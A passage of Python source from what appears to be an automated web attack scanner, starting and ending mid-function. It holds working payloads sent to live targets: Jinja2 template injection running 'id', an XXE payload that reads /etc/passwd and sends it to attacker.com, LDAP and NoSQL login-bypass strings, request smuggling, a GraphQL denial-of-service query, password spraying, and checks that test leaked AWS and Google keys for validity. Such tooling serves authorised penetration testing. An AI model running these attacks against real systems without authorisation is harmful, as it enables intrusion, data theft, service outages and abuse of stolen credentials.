            except: continue
    return findings


def scan_unkeyed_cache_poisoning(crawl_data):
    """Web cache poisoning via unkeyed headers — headers not in cache key but reflected."""
    findings = []
    tested = set()
    # Headers that are often unkeyed but reflected
    unkeyed_headers = [
        ("X-Forwarded-Host", "apex-cache-poison.evil.com"),
        ("X-Forwarded-Scheme", "https://apex-cache-poison.evil.com"),
        ("X-Original-URL", "/apex-cache-poison"),
        ("X-Rewrite-URL", "/apex-cache-poison"),
        ("X-Forwarded-Port", "1337"),
        ("X-Host", "apex-cache-poison.evil.com"),
        ("X-Forwarded-Server", "apex-cache-poison.evil.com"),
        ("Forwarded", "host=apex-cache-poison.evil.com"),
    ]
    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"]
        base = "/".join(url.split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            baseline = _S.get(url, timeout=5)
        except: continue

        for header, value in unkeyed_headers:
            try:
                r = _S.get(url, timeout=5, headers={header: value})
                # Check if value is reflected in response
                if "apex-cache-poison" in r.text and "apex-cache-poison" not in baseline.text:
                    # Check if response is cacheable
                    cache_control = r.headers.get("Cache-Control", "")
                    age = r.headers.get("Age", "")
                    cf_cache = r.headers.get("CF-Cache-Status", "")
                    is_cacheable = (
                        "no-store" not in cache_control and
                        "private" not in cache_control
                    )
                    sev = "critical" if is_cacheable else "high"
                    findings.append({
                        "type": f"Unkeyed Cache Poisoning via {header}",
                        "severity": sev,
                        "url": url,
                        "detail": f"{header}: {value} reflected in response — {'cacheable' if is_cacheable else 'not cached but reflected'}",
                        "template": "apex-cache-unkeyed",
                    })
                    break
            except: continue
    return findings


def scan_graphql_alias_introspection(crawl_data):
    """Bypass disabled GraphQL introspection via alias batching and field suggestion."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Check if introspection is disabled
                r = _S.post(url, json={"query": "{__schema{types{name}}}"},
                           headers={"Content-Type": "application/json"}, timeout=5)
                if "__schema" in r.text: continue  # Introspection enabled, skip

                if r.status_code not in (200, 400): continue

                # Bypass 1: Use __type instead of __schema
                r2 = _S.post(url, json={"query": "{__type(name:\"Query\"){fields{name}}}"},
                            headers={"Content-Type": "application/json"}, timeout=5)
                if "fields" in r2.text and "__type" not in r2.text:
                    try:
                        data = json.loads(r2.text)
                        fields = [f["name"] for f in
                                  data.get("data",{}).get("__type",{}).get("fields",[]) or []]
                        if fields:
                            findings.append({
                                "type": "GraphQL Introspection Bypass via __type",
                                "severity": "medium",
                                "url": url,
                                "detail": f"Schema leaked via __type despite disabled introspection: {', '.join(fields[:10])}",
                                "template": "apex-gql-bypass",
                            })
                    except: pass

                # Bypass 2: Clairvoyance-style — probe with common type names
                for type_name in ["User", "Admin", "Query", "Mutation", "Account", "Payment"]:
                    r3 = _S.post(url,
                                json={"query": f'{{__type(name:"{type_name}"){{fields{{name type{{name}}}}}}}}'},
                                headers={"Content-Type": "application/json"}, timeout=3)
                    if r3.status_code == 200 and "fields" in r3.text:
                        try:
                            data = json.loads(r3.text)
                            fields = data.get("data",{}).get("__type",{})
                            if fields and fields.get("fields"):
                                field_names = [f["name"] for f in fields["fields"][:5]]
                                findings.append({
                                    "type": f"GraphQL Type Disclosure: {type_name}",
                                    "severity": "medium",
                                    "url": url,
                                    "detail": f"Type {type_name} fields: {', '.join(field_names)}",
                                    "template": "apex-gql-bypass",
                                })
                        except: pass
            except: continue
    return findings


def scan_nosql_operator_injection(crawl_data):
    """NoSQL injection via MongoDB operators in JSON body and query params."""
    findings = []
    # MongoDB operator payloads
    nosql_payloads = [
        {"$gt": ""},
        {"$ne": "invalid_xyz"},
        {"$regex": ".*"},
        {"$where": "1==1"},
        {"$exists": True},
    ]
    success_indicators = ["welcome", "dashboard", "logged", "token", "success",
                          "user", "profile", "account", "home"]
    error_indicators = ["invalid", "incorrect", "failed", "wrong", "error", "unauthorized"]

    # Test forms
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        action = form.get("action", "")
        if not action: continue
        inputs = form.get("inputs", [])
        auth_inputs = [i for i in inputs if i.get("type") in ("text", "email", "password")
                       or any(x in i.get("name","").lower() for x in ("user","email","pass","login"))]
        if not auth_inputs: continue

        try:
            # Baseline with wrong creds
            baseline_data = {i.get("name","f"): "wrong_value_xyz" for i in inputs}
            baseline = _S.post(action, json=baseline_data, timeout=5)
            baseline_body = baseline.text.lower()

            for payload in nosql_payloads:
                data = dict(baseline_data)
                for inp in auth_inputs:
                    data[inp.get("name","f")] = payload
                r = _S.post(action, json=data, timeout=5,
                           headers={"Content-Type": "application/json"})
                body = r.text.lower()
                if (r.status_code in (200, 302) and
                        any(x in body for x in success_indicators) and
                        not any(x in body for x in error_indicators) and
                        r.text != baseline.text):
                    findings.append({
                        "type": "NoSQL Injection (MongoDB Operator)",
                        "severity": "critical",
                        "url": action,
                        "detail": f"Operator {list(payload.keys())[0]} bypasses authentication",
                        "template": "apex-nosql-op",
                    })
                    break
        except: continue

    # Test GET params
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload_str in ["[$ne]=invalid", "[$gt]=", "[$regex]=.*"]:
                try:
                    test_url = f"{url.split('?')[0]}?{p}{payload_str}"
                    r = _S.get(test_url, timeout=5)
                    if r.status_code == 200 and len(r.content) > 100:
                        findings.append({
                            "type": "NoSQL Injection (GET Operator)",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"MongoDB operator in param {p} returns data",
                            "template": "apex-nosql-op",
                        })
                        break
                except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 13: LDAP injection, Twig/Smarty SSTI, blind XPath,
#                 WebSocket origin bypass, Server-Timing oracle,
#                 CSP bypass via JSONP, API key rotation bypass,
#                 GraphQL circular fragment DoS, javascript: redirect
# ---------------------------------------------------------------------------

def scan_ldap_injection(crawl_data):
    """LDAP injection in authentication and search forms."""
    findings = []
    # LDAP injection payloads
    payloads = [
        ("*", "wildcard — matches all"),
        ("*)(uid=*))(|(uid=*", "filter bypass"),
        ("admin)(&(password=*", "auth bypass"),
        ("*)(|(objectClass=*", "objectClass dump"),
        (")(|(cn=*", "cn wildcard"),
        ("\\2a)(uid=*))(|(uid=\\2a", "encoded wildcard"),
    ]
    error_markers = ["ldap", "ldap_search", "invalid dn", "ldap error",
                     "javax.naming", "ldapexception", "invalid filter"]
    success_markers = ["welcome", "dashboard", "logged in", "success", "token"]

    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        action = form.get("action", "")
        if not action: continue
        inputs = form.get("inputs", [])
        auth_inputs = [i for i in inputs
                       if any(x in i.get("name","").lower()
                              for x in ("user","email","login","uid","cn","dn"))]
        if not auth_inputs: continue

        try:
            baseline = _S.post(action,
                               data={i.get("name","f"): "test" for i in inputs},
                               timeout=5)
        except: continue

        for payload, desc in payloads:
            try:
                data = {i.get("name","f"): i.get("value","test") for i in inputs}
                for inp in auth_inputs:
                    data[inp.get("name","f")] = payload
                r = _S.post(action, data=data, timeout=5)
                body = r.text.lower()
                if any(e in body for e in error_markers):
                    findings.append({
                        "type": "LDAP Injection (Error-Based)",
                        "severity": "high",
                        "url": action,
                        "detail": f"LDAP error triggered by payload: {payload} ({desc})",
                        "template": "apex-ldap",
                    })
                    break
                if (r.status_code in (200, 302) and
                        any(s in body for s in success_markers) and
                        r.text != baseline.text):
                    findings.append({
                        "type": "LDAP Injection (Auth Bypass)",
                        "severity": "critical",
                        "url": action,
                        "detail": f"LDAP filter bypass with: {payload} ({desc})",
                        "template": "apex-ldap",
                    })
                    break
            except: continue
    return findings


def scan_template_injection_twig(crawl_data):
    """Twig/Smarty/Pebble/Freemarker SSTI — different syntax from Jinja2."""
    findings = []
    payloads = [
        # Twig
        ("{{7*7}}", "49"),
        ("{{7*'7'}}", "49"),
        ("{{'a'~'b'}}", "ab"),
        # Smarty
        ("{7*7}", "49"),
        ("{math equation='7*7'}", "49"),
        # Pebble
        ("{{7*7}}", "49"),
        # Freemarker
        ("${7*7}", "49"),
        ("<#assign x=7*7>${x}", "49"),
        # Velocity
        ("#set($x=7*7)$x", "49"),
        # Mako
        ("${7*7}", "49"),
        # Handlebars
        ("{{#with 7}}{{this}}{{/with}}", "7"),
        # ERB (Ruby)
        ("<%= 7*7 %>", "49"),
        # Jinja2 (already covered but include for completeness)
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid="),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, marker in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if marker in r.text and payload not in r.text:
                        findings.append({
                            "type": "Server-Side Template Injection (Twig/Smarty/Freemarker)",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"Template executed via param '{p}': {payload} → {marker}",
                            "template": "apex-ssti-twig",
                        })
                        break
                except: continue
    return findings


def scan_websocket_origin_bypass(crawl_data):
    """WebSocket connections without Origin validation — cross-site WebSocket hijacking."""
    findings = []
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            ws_urls = re.findall(r'wss?://[^\s\'"<>]+', r.text)
            for ws_url in ws_urls[:3]:
                # Try connecting with evil origin
                try:
                    import websocket as _ws
                    headers = {"Origin": "https://evil.com"}
                    ws = _ws.create_connection(ws_url, timeout=5, header=headers)
                    # If connection succeeds without origin check
                    ws.send('{"type":"ping"}')
                    result = ws.recv()
                    ws.close()
                    findings.append({
                        "type": "WebSocket Cross-Origin Hijacking",
                        "severity": "high",
                        "url": ws_url,
                        "detail": "WebSocket accepts connections from evil.com origin — CSWSH possible",
                        "template": "apex-ws-origin",
                    })
                except ImportError:
                    # websocket-client not installed — flag for manual testing
                    findings.append({
                        "type": "WebSocket Endpoint (Manual Origin Check Needed)",
                        "severity": "info",
                        "url": ws_url,
                        "detail": f"WebSocket found at {ws_url} — manually verify Origin header validation",
                        "template": "apex-ws-origin",
                    })
                except Exception:
                    pass
        except: pass
    return findings


def scan_server_timing_oracle(crawl_data):
    """Server-Timing header leaks internal timing info — user enumeration, cache status."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            timing = r.headers.get("Server-Timing", "")
            if timing:
                # Parse timing values
                import re as _re
                durations = _re.findall(r'dur=([0-9.]+)', timing)
                metrics = _re.findall(r'([a-zA-Z_-]+);', timing)
                sensitive = [m for m in metrics if any(x in m.lower()
                             for x in ["db", "sql", "cache", "auth", "user", "query",
                                       "redis", "mongo", "elastic", "backend"])]
                if sensitive:
                    findings.append({
                        "type": "Server-Timing Leaks Internal Metrics",
                        "severity": "low",
                        "url": page["url"],
                        "detail": f"Server-Timing exposes: {', '.join(sensitive)} — timing oracle possible",
                        "template": "apex-server-timing",
                    })
                elif timing:
                    findings.append({
                        "type": "Server-Timing Header Present",
                        "severity": "info",
                        "url": page["url"],
                        "detail": f"Server-Timing: {timing[:100]} — may leak internal timing",
                        "template": "apex-server-timing",
                    })
        except: pass

    # Test timing difference for valid vs invalid users
    for page in crawl_data.get("pages", []):
        if not any(x in page["url"].lower() for x in ["login", "auth", "signin"]): continue
        base = "/".join(page["url"].split("/", 3)[:3])
        for path in ["/login", "/api/login", "/auth"]:
            try:
                import time as _t
                times = []
                for email in ["admin@admin.com", "nonexistent_xyz_12345@test.com"]:
                    start = _t.time()
                    r = _S.post(f"{base}{path}",
                               json={"email": email, "password": "wrong"},
                               timeout=5)
                    elapsed = _t.time() - start
                    timing = r.headers.get("Server-Timing", "")
                    times.append((email, elapsed, timing))
                if len(times) == 2:
                    diff = abs(times[0][1] - times[1][1])
                    if diff > 0.15:  # 150ms difference
                        findings.append({
                            "type": "Timing Oracle: User Enumeration",
                            "severity": "medium",
                            "url": f"{base}{path}",
                            "detail": f"Valid user takes {times[0][1]*1000:.0f}ms vs invalid {times[1][1]*1000:.0f}ms ({diff*1000:.0f}ms diff)",
                            "template": "apex-timing-oracle",
                        })
            except: continue
    return findings


def scan_csp_bypass_jsonp(crawl_data):
    """CSP bypass via JSONP endpoints — script-src allows domain with JSONP."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            csp = r.headers.get("Content-Security-Policy", "")
            if not csp: continue

            # Extract allowed script domains from CSP
            script_src = re.search(r'script-src[^;]+', csp)
            if not script_src: continue
            allowed_domains = re.findall(r'https?://([^\s;]+)', script_src.group())

            # Check if any allowed domain has a JSONP endpoint
            for domain in allowed_domains[:5]:
                for jsonp_path in ["/jsonp", "/api/jsonp", "/callback",
                                   "/api/callback", "/json", "/data"]:
                    try:
                        r2 = _S.get(f"https://{domain}{jsonp_path}?callback=alert",
                                   timeout=3)
                        if "alert(" in r2.text and r2.headers.get("content-type","").startswith("application/javascript"):
                            findings.append({
                                "type": "CSP Bypass via JSONP",
                                "severity": "high",
                                "url": page["url"],
                                "detail": f"CSP allows {domain} which has JSONP at {jsonp_path} — XSS possible",
                                "template": "apex-csp-jsonp",
                            })
                    except: continue
        except: pass
    return findings


def scan_api_key_rotation_bypass(crawl_data, web_targets):
    """Test if old/rotated API keys still work — common after key rotation incidents."""
    findings = []
    # Look for API keys in JS files and test if they're still valid
    for page in crawl_data.get("pages", [])[:5]:
        try:
            r = _S.get(page["url"], timeout=5)
            # Find API key patterns
            key_patterns = [
                (r'AKIA[0-9A-Z]{16}', "AWS Access Key"),
                (r'sk_live_[0-9a-zA-Z]{24,}', "Stripe Secret Key"),
                (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key"),
                (r'gh[pousr]_[A-Za-z0-9_]{36,}', "GitHub Token"),
                (r'xox[bpors]-[0-9a-zA-Z]{10,48}', "Slack Token"),
                (r'[0-9a-f]{32}', "Generic 32-char hex key"),
            ]
            for pattern, key_type in key_patterns:
                matches = re.findall(pattern, r.text)
                for key in matches[:2]:
                    # Test if key is still valid
                    if key_type == "AWS Access Key":
                        try:
                            test_r = requests.get(
                                "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15",
                                headers={"Authorization": f"AWS4-HMAC-SHA256 Credential={key}"},
                                timeout=5
                            )
                            if "UserId" in test_r.text:
                                findings.append({
                                    "type": f"Valid {key_type} Found",
                                    "severity": "critical",
                                    "url": page["url"],
                                    "detail": f"Active {key_type}: {key[:8]}...",
                                    "template": "apex-key-rotation",
                                })
                        except: pass
                    elif key_type == "Google API Key":
                        try:
                            test_r = requests.get(
                                f"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token={key}",
                                timeout=5
                            )
                            if test_r.status_code == 200:
                                findings.append({
                                    "type": f"Valid {key_type} Found",
                                    "severity": "critical",
                                    "url": page["url"],
                                    "detail": f"Active {key_type}: {key[:8]}...",
                                    "template": "apex-key-rotation",
                                })
                        except: pass
                    else:
                        # Just report the key found
                        if len(key) >= 20:
                            findings.append({
                                "type": f"Potential {key_type} in Source",
                                "severity": "high",
                                "url": page["url"],
                                "detail": f"{key_type}: {key[:12]}... — verify if still active",
                                "template": "apex-key-rotation",
                            })
        except: pass
    return findings


def scan_graphql_circular_fragment(crawl_data):
    """GraphQL circular fragment DoS — deeply nested circular references exhaust server."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Check endpoint exists
                probe = _S.post(url, json={"query": "{__typename}"},
                               headers={"Content-Type": "application/json"}, timeout=3)
                if probe.status_code not in (200, 400): continue

                # Circular fragment query
                circular = """
fragment A on Query { ...B }
fragment B on Query { ...C }
fragment C on Query { ...A }
{ ...A }
"""
                import time as _t
                start = _t.time()
                r = _S.post(url, json={"query": circular},
                           headers={"Content-Type": "application/json"}, timeout=10)
                elapsed = _t.time() - start

                if elapsed > 3:
                    findings.append({
                        "type": "GraphQL Circular Fragment DoS",
                        "severity": "high",
                        "url": url,
                        "detail": f"Circular fragment query took {elapsed:.1f}s — no cycle detection",
                        "template": "apex-gql-circular",
                    })
                elif r.status_code == 200 and "errors" not in r.text:
                    findings.append({
                        "type": "GraphQL No Circular Fragment Protection",
                        "severity": "medium",
                        "url": url,
                        "detail": "Server accepted circular fragment without error",
                        "template": "apex-gql-circular",
                    })
            except requests.exceptions.Timeout:
                findings.append({
                    "type": "GraphQL Circular Fragment DoS (Timeout)",
                    "severity": "critical",
                    "url": url,
                    "detail": "Circular fragment caused server timeout",
                    "template": "apex-gql-circular",
                })
            except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 14: TE.TE smuggling, IDOR in batch APIs,
#                 GraphQL persisted query injection,
#                 XXE parameter entities, blind SSRF via DNS,
#                 OAuth account takeover, meta refresh redirect,
#                 advanced clickjacking, NS takeover
# ---------------------------------------------------------------------------

def scan_http_desync_te_te(web_targets):
    """TE.TE HTTP desync — both CL and TE present, obfuscated TE header."""
    import socket, ssl as _ssl
    findings = []
    # TE.TE: both endpoints support TE but one ignores obfuscated header
    obfuscations = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked, chunked",
        "Transfer-Encoding:\tchunked",
        "X: X\r\nTransfer-Encoding: chunked",
        "Transfer-Encoding: x",
    ]
    for target in web_targets[:3]:
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc.split(":")[0]
        port = 443 if parsed.scheme == "https" else 80
        path = parsed.path or "/"
        for te_header in obfuscations[:2]:
            try:
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 4\r\n"
                    f"{te_header}\r\n"
                    f"\r\n"
                    f"1\r\n"
                    f"Z\r\n"
                    f"0\r\n\r\n"
                ).encode()
                sock = socket.create_connection((host, port), timeout=5)
                if port == 443:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.settimeout(8)
                sock.send(payload)
                resp = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk: break
                        resp += chunk
                except Exception:
                    pass
                sock.close()
                resp_str = resp.decode("utf-8", errors="ignore")
                if resp_str.count("HTTP/1.") >= 2:
                    findings.append({
                        "type": "HTTP Desync TE.TE (Obfuscated Transfer-Encoding)",
                        "severity": "critical",
                        "url": target,
                        "detail": f"Two responses for one request with obfuscated TE: {te_header[:40]}",
                        "template": "apex-desync-tete",
                    })
                    break
            except Exception:
                continue
    return findings


def scan_idor_batch_api(crawl_data):
    """IDOR in batch/bulk API endpoints — process multiple IDs at once."""
    findings = []
    batch_paths = [
        "/api/batch", "/api/bulk", "/api/v1/batch", "/api/v1/bulk",
        "/api/users/batch", "/api/items/batch", "/batch", "/bulk",
        "/api/v2/batch", "/api/export", "/api/v1/export",
    ]
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        for path in batch_paths:
            url = f"{base}{path}"
            # Test batch with mixed IDs including low sequential ones
            for payload in [
                {"ids": [1, 2, 3, 4, 5]},
                {"user_ids": [1, 2, 3]},
                {"ids": ["1", "2", "3"]},
                [{"id": 1}, {"id": 2}, {"id": 3}],
            ]:
                try:
                    r = _S.post(url, json=payload, timeout=5,
                               headers={"Content-Type": "application/json"})
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            items = data if isinstance(data, list) else data.get("data", data.get("items", []))
                            if isinstance(items, list) and len(items) > 0:
                                has_sensitive = any(
                                    k in str(items).lower()
                                    for k in ["email", "phone", "ssn", "password", "token", "credit"]
                                )
                                sev = "critical" if has_sensitive else "high"
                                findings.append({
                                    "type": f"IDOR via Batch API: {path}",
                                    "severity": sev,
                                    "url": url,
                                    "detail": f"Batch endpoint returns {len(items)} records for arbitrary IDs",
                                    "template": "apex-idor-batch",
                                })
                                break
                        except Exception:
                            pass
                except Exception:
                    continue
    return findings


def scan_graphql_persisted_query(crawl_data):
    """GraphQL persisted query injection — inject via apq extension."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Test Automatic Persisted Queries (APQ)
                # First: send hash without query (APQ miss)
                r1 = _S.post(url, json={
                    "extensions": {
                        "persistedQuery": {
                            "version": 1,
                            "sha256Hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                        }
                    }
                }, headers={"Content-Type": "application/json"}, timeout=5)

                if r1.status_code == 200 and "PersistedQueryNotFound" in r1.text:
                    # APQ is enabled — try to register a malicious query
                    import hashlib as _hl
                    malicious_query = "{__schema{types{name}}}"
                    query_hash = _hl.sha256(malicious_query.encode()).hexdigest()
                    r2 = _S.post(url, json={
                        "query": malicious_query,
                        "extensions": {
                            "persistedQuery": {"version": 1, "sha256Hash": query_hash}
                        }
                    }, headers={"Content-Type": "application/json"}, timeout=5)

                    if r2.status_code == 200 and "__schema" in r2.text:
                        findings.append({
                            "type": "GraphQL APQ Introspection Bypass",
                            "severity": "medium",
                            "url": url,
                            "detail": "Automatic Persisted Queries enabled — introspection via APQ",
                            "template": "apex-gql-apq",
                        })
                    elif r2.status_code == 200:
                        findings.append({
                            "type": "GraphQL Automatic Persisted Queries Enabled",
                            "severity": "low",
                            "url": url,
                            "detail": "APQ enabled — can register and replay arbitrary queries",
                            "template": "apex-gql-apq",
                        })
            except Exception:
                continue
    return findings


def scan_xxe_parameter_entity(crawl_data):
    """XXE via parameter entities — bypasses some XXE filters."""
    findings = []
    # Parameter entity XXE (harder to filter than regular entities)
    xxe_param = b"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>"""

    xxe_error = b"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % wrapper "<!ENTITY send SYSTEM 'file:///nonexistent/%xxe;'>">
  %wrapper;
]>
<root>&send;</root>"""

    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        action = form.get("action", "")
        if not action: continue
        for payload, name in [(xxe_param, "parameter entity"), (xxe_error, "error-based")]:
            try:
                r = _S.post(action, data=payload,
                           headers={"Content-Type": "application/xml"}, timeout=8)
                if "root:" in r.text or "daemon:" in r.text:
                    findings.append({
                        "type": f"XXE Parameter Entity ({name})",
                        "severity": "critical",
                        "url": action,
                        "detail": f"XXE via {name} reads /etc/passwd",
                        "template": "apex-xxe-param",
                    })
                    break
                elif r.status_code in (200, 500) and "xml" in r.headers.get("content-type","").lower():
                    findings.append({
                        "type": f"XML Endpoint Accepts External Entities",
                        "severity": "medium",
                        "url": action,
                        "detail": "XML endpoint processes external entities — test for XXE manually",
                        "template": "apex-xxe-param",
                    })
                    break
            except Exception:
                continue
    return findings


def scan_open_redirect_meta(crawl_data):
    """Open redirect via meta refresh and JavaScript location — often missed."""
    findings = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in ("url", "redirect", "next", "goto", "dest", "return",
                                  "continue", "target", "link", "ref", "referer"):
                continue
            for payload in ["https://evil.com", "//evil.com", "javascript:alert(1)"]:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT, allow_redirects=False)
                    # Check meta refresh
                    if "meta" in r.text.lower() and "refresh" in r.text.lower():
                        meta_match = re.search(
                            r'<meta[^>]+http-equiv=["\']refresh["\'][^>]+content=["\'][^"\']*url=([^"\'>\s]+)',
                            r.text, re.IGNORECASE)
                        if meta_match:
                            redirect_url = meta_match.group(1)
                            if "evil.com" in redirect_url or redirect_url == payload:
                                findings.append({
                                    "type": "Open Redirect via Meta Refresh",
                                    "severity": "medium",
                                    "url": test_url,
                                    "detail": f"Meta refresh redirects to: {redirect_url}",
                                    "template": "apex-redirect-meta",
                                })
                                break
                    # Check JavaScript location redirect
                    if "javascript:" in payload.lower():
                        if payload in r.text:
                            findings.append({
                                "type": "Open Redirect via javascript: Protocol",
                                "severity": "high",
                                "url": test_url,
                                "detail": f"javascript: protocol reflected in redirect param '{p}'",
                                "template": "apex-redirect-js",
                            })
                            break
                except Exception:
                    continue
    return findings


def scan_cors_with_credentials(crawl_data):
    """CORS misconfiguration with credentials — the exploitable variant."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        host = urllib.parse.urlparse(base).netloc
        domain_parts = host.split(".")
        tld = ".".join(domain_parts[-2:]) if len(domain_parts) >= 2 else host

        test_origins = [
            "https://evil.com",
            f"https://evil.{tld}",
            f"https://{tld}.evil.com",
            "null",
            f"https://not{tld}",
        ]
        for origin in test_origins:
            try:
                r = _S.get(page["url"], timeout=5,
                          headers={"Origin": origin, "Cookie": "session=test"})
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                if acac.lower() == "true" and acao not in ("", "*"):
                    if acao == origin or acao == "*":
                        findings.append({
                            "type": "CORS with Credentials (Data Theft)",
                            "severity": "critical",
                            "url": page["url"],
                            "detail": f"ACAO: {acao}, ACAC: true — cross-origin authenticated requests possible",
                            "template": "apex-cors-creds",
                        })
                        break
            except Exception:
                pass
    return findings


def scan_clickjacking_advanced(crawl_data):
    """Advanced clickjacking — drag-drop data exfiltration, form hijacking."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            xfo = r.headers.get("X-Frame-Options", "")
            csp = r.headers.get("Content-Security-Policy", "")
            has_frame_protection = (
                xfo.upper() in ("DENY", "SAMEORIGIN") or
                "frame-ancestors" in csp.lower()
            )
            if has_frame_protection: continue

            # Check if page has sensitive forms (login, payment, settings)
            body = r.text.lower()
            has_sensitive = any(x in body for x in
                               ["password", "credit", "card", "payment", "transfer",
                                "confirm", "delete", "admin", "settings", "profile"])
            if has_sensitive:
                findings.append({
                    "type": "Clickjacking on Sensitive Page",
                    "severity": "high",
                    "url": page["url"],
                    "detail": "No X-Frame-Options/CSP frame-ancestors on page with sensitive actions",
                    "template": "apex-clickjack-adv",
                })
            else:
                findings.append({
                    "type": "Clickjacking (No Frame Protection)",
                    "severity": "medium",
                    "url": page["url"],
                    "detail": "Page can be embedded in iframe — clickjacking possible",
                    "template": "apex-clickjack-adv",
                })
        except Exception:
            pass
    return findings


def scan_subdomain_ns_takeover(target, subdomains):
    """NS record subdomain takeover — if NS servers are unregistered."""
    findings = []
    for sub in subdomains[:50]:
        try:
            result = subprocess.run(
                ["dig", "+short", "NS", sub],
                capture_output=True, text=True, timeout=5
            )
            ns_records = [n.rstrip(".") for n in result.stdout.splitlines() if n.strip()]
            if not ns_records: continue
            for ns in ns_records:
                # Check if NS server resolves
                try:
                    import socket as _sock
                    _sock.getaddrinfo(ns, None)
                except _sock.gaierror:
                    findings.append({
                        "type": "NS Record Takeover",
                        "severity": "critical",
                        "url": f"dns://{sub}",
                        "detail": f"NS server {ns} doesn't resolve — register it to take over {sub}",
                        "template": "apex-ns-takeover",
                    })
                    break
        except Exception:
            continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 15: Password spray, GraphQL variable injection,
#                 broken function-level auth, mass user enumeration,
#                 CORS Vary:Origin, insecure JWT storage,
#                 2FA response manipulation, SSRF via redirect
# ---------------------------------------------------------------------------

_COMMON_PASSWORDS = [
    "password", "123456", "password123", "admin", "letmein", "qwerty",
    "welcome", "monkey", "dragon", "master", "abc123", "pass123",
    "iloveyou", "sunshine", "princess", "football", "shadow", "superman",
    "michael", "password1", "123456789", "12345678", "1234567890",
    "admin123", "root", "toor", "test", "guest", "changeme",
]

def scan_password_spray(crawl_data):
    """Password spray — try common passwords against discovered usernames."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", []):
        if not any(x in page["url"].lower() for x in ["login", "signin", "auth"]): continue
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/login", "/api/login", "/auth/login", "/signin", "/api/signin"]:
            url = f"{base}{path}"
            # Test with common username/password combos — just 3 attempts to avoid lockout
            for user, pwd in [("admin", "admin"), ("admin", "password"), ("test", "test")]:
                try:
                    r = _S.post(url, json={"email": f"{user}@{base.split('//')[1].split('/')[0]}",
                                          "username": user, "password": pwd}, timeout=5)
                    body = r.text.lower()
                    if (r.status_code in (200, 302) and
                            any(x in body for x in ["dashboard","welcome","logout","token","success"]) and
